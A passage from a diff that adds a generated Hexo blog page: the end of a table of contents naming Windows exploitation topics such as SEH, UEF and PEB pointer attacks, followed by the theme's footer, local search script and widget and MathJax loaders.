VEH利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-攻击TEB中的SEH头节点"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 攻击TEB中的SEH头节点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-3-攻击UEF"><span class="nav-number">5.3.</span> <span class="nav-text">5.3 攻击UEF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-4-攻击PEB中的函数指针"><span class="nav-number">5.4.</span> <span class="nav-text">5.4 攻击PEB中的函数指针</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Introspelliam</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+  
+
+
+  
+
+  
+
+</body>
+</html>
